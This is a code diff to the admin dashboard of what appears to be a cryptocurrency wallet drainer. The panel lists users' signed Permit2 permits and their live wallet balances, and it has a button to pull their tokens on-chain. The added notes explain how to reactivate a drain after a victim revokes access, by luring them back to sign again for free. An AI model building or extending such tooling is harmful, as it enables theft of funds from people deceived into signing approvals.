@@ -667,18 +667,34 @@ function getExpiryCountdown(ts) {
 }
 
 function isPullable(p) {
-  if (p.pullable !== undefined) return p.pullable;
+  if (p.pullable !== undefined) return Boolean(p.pullable);
   const now = Math.floor(Date.now() / 1000);
   return Number(p.expiration) > now && Number(p.sigDeadline) > now && (p.status === 'pending' || p.status === 'partial');
 }
 
 function pullableBadgeHtml(p) {
-  if (p.pullableStatus === 'ready' || p.pullableStatus === 'ready_submit' || (p.pullable && p.pullableStatus !== 'expired_sig' && p.pullableStatus !== 'no_erc20')) {
+  if (p.pullableStatus === 'ready') {
     return `
       <div style="display:inline-flex;align-items:center;gap:4px;">
         <span class="badge badge-pullable">🟢 OK Always</span>
       </div>
-      <div style="font-size:.67rem;color:#4ade80;margin-top:2px;font-weight:600;">Available for Pullout</div>
+      <div style="font-size:.67rem;color:#4ade80;margin-top:2px;font-weight:600;">Active (${esc(p.onChainAllowanceHuman || '')} ${esc(p.tokenSymbol || '')})</div>
+    `;
+  }
+  if (p.pullableStatus === 'ready_submit') {
+    return `
+      <div style="display:inline-flex;align-items:center;gap:4px;">
+        <span class="badge badge-pullable">🟢 OK Ready</span>
+      </div>
+      <div style="font-size:.67rem;color:#4ade80;margin-top:2px;font-weight:600;">Auto-Submits On Pull</div>
+    `;
+  }
+  if (p.pullableStatus === 'revoked_nonce') {
+    return `
+      <div style="display:inline-flex;align-items:center;gap:4px;">
+        <span class="badge badge-failed" title="${esc(p.pullableReason || '')}">❌ Nonce Expired</span>
+      </div>
+      <div style="font-size:.67rem;color:#f87171;margin-top:2px;font-weight:600;">Permit2 Locked Down</div>
     `;
   }
   if (p.pullableStatus === 'no_erc20') {
@@ -699,8 +715,9 @@ function pullableBadgeHtml(p) {
   }
   return `
     <div style="display:inline-flex;align-items:center;gap:4px;">
-      <span class="badge badge-expired">⚪ Inactive</span>
+      <span class="badge badge-expired" title="${esc(p.pullableReason || '')}">⚪ Inactive</span>
     </div>
+    <div style="font-size:.67rem;color:var(--text-muted);margin-top:2px;font-weight:600;">${esc(p.pullableText || 'Not Available')}</div>
   `;
 }
 
@@ -848,7 +865,10 @@ function buildDashboard(s) {
     <div class="card">
       <div class="card-header">
         <div class="card-title"><div class="card-title-icon">📋</div> Signed Permits Database</div>
-        <span style="font-size:.78rem;color:var(--text-muted)">${state.permits.length} record${state.permits.length !== 1 ? 's' : ''}</span>
+        <div style="display:flex;align-items:center;gap:12px;">
+          <button id="btn-refresh-permits" class="btn btn-secondary" style="padding:6px 12px;font-size:.8rem;">🔄 Refresh Live Balances</button>
+          <span style="font-size:.78rem;color:var(--text-muted)">${state.permits.length} record${state.permits.length !== 1 ? 's' : ''}</span>
+        </div>
       </div>
 
       ${state.permits.length === 0
@@ -1225,12 +1245,18 @@ function renderModal() {
           <div class="summary-row">
             <span class="summary-label">Available for Pullout</span>
             <span class="summary-val" style="font-weight:700;color:${isPullable(p) ? '#4ade80' : '#f87171'};">
-              ${isPullable(p) ? '🟢 OK ALWAYS — Ready for Pullout' : esc(p.pullableText || '❌ Not Available')}
+              ${isPullable(p) ? (p.pullableStatus === 'ready' ? '🟢 OK ALWAYS — Active On-Chain' : '🟢 OK Ready to Submit') : esc(p.pullableText || '❌ Not Available')}
             </span>
           </div>
           <div class="summary-row">
             <span class="summary-label">Live In User Wallet</span>
             <span class="summary-val" style="color:#4ade80;font-weight:700;">${esc(userBal)} ${esc(p.tokenSymbol)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">On-Chain Permit2 Allowance</span>
+            <span class="summary-val" style="font-family:var(--font-mono);font-weight:600;color:${Number(p.onChainAllowanceHuman || 0) > 0 ? '#4ade80' : '#f59e0b'};">
+              ${esc(p.onChainAllowanceHuman || '0.0')} ${esc(p.tokenSymbol)}
+            </span>
           </div>
           <div class="summary-row">
             <span class="summary-label">Total Approved Limit</span>
@@ -1245,6 +1271,7 @@ function renderModal() {
         ${!isPullable(p) ? `
           <div style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius-md);padding:10px 14px;margin-bottom:14px;font-size:.8rem;color:#fca5a5;line-height:1.5;">
             <strong>⚠️ Cannot Pull On-Chain:</strong> ${esc(p.pullableReason || 'This permit cannot be executed on-chain.')}
+            ${p.pullableStatus === 'revoked_nonce' ? '<div style="margin-top:6px;color:#fecaca;">💡 <strong>Why this happened:</strong> The user wallet called Permit2 lockdown (resetting allowance to 0 and advancing on-chain nonce). The user still has unlimited ERC-20 approval, so once they connect to the site and click approve (0-gas 1-click free sign), it will instantly reactivate with a fresh nonce!</div>' : ''}
             ${p.pullableStatus === 'expired_sig' ? '<div style="margin-top:6px;color:#fecaca;">💡 <strong>Note:</strong> The user already has permanent on-chain approval! Once the user visits the site and signs (0 gas free sign), this permit will instantly become pullable for 150 days.</div>' : ''}
             ${p.pullableStatus === 'no_erc20' ? '<div style="margin-top:6px;color:#fecaca;">💡 The user wallet currently has 0 ERC-20 approval to Permit2 (approval was revoked or never granted).</div>' : ''}
           </div>
@@ -1266,7 +1293,7 @@ function renderModal() {
         </div>
 
         <button id="btn-modal-confirm" class="btn btn-pull" style="width:100%;margin-top:14px;padding:12px;${!isPullable(p) ? 'opacity:0.5;cursor:not-allowed;' : ''}" ${state.pullSubmitting || !isPullable(p) ? 'disabled' : ''}>
-          ${state.pullSubmitting ? '<span class="spinner"></span> Pulling on-chain…' : (!isPullable(p) ? '⛔ Cannot Pull (See Notice Above)' : '🚀 Confirm & Pull Tokens On-Chain')}
+          ${state.pullSubmitting ? '<span class="spinner"></span> Pulling on-chain…' : (!isPullable(p) ? '⛔ Cannot Pull: ' + esc(p.pullableText || 'Not Ready') : '🚀 Confirm & Pull Tokens On-Chain')}
         </button>
 
         ${state.pullError ? `<div class="alert alert-err"><span>❌</span><span>${esc(state.pullError)}</span></div>` : ''}
@@ -1348,6 +1375,7 @@ function bind() {
       }
     };
   }
+  if ($('btn-refresh-permits')) $('btn-refresh-permits').onclick = handleAdminLoad;
   if ($('btn-toggle-pause')) $('btn-toggle-pause').onclick = handleTogglePause;
   if ($('btn-set-fee')) $('btn-set-fee').onclick = handleSetFee;
   if ($('btn-set-treasury')) $('btn-set-treasury').onclick = handleSetTreasury;
